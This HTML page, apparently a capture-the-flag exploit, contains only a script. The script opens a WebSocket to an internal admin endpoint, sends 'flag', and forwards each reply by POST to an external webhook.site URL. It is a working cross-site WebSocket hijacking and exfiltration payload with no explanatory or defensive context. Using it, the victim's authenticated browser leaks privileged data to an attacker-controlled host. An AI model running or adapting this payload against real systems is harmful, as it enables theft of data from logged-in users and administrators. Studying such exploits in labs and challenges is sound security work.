<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CE441</title>
</head>
<body>
  <script>
        const webhookURL = "https://webhook.site/308904c1-7e12-46fc-943f-7bf4747b9658";
        const ws = new WebSocket('ws://web:8080/admin/ws');
        ws.onopen = () => ws.send("flag");
        ws.onmessage = (event) => {
            const receivedMessage = event.data;
            fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ message: receivedMessage })
            })
            .then(response => {
                console.log(response.status);
            });
        }
    </script>
</body>
</html>
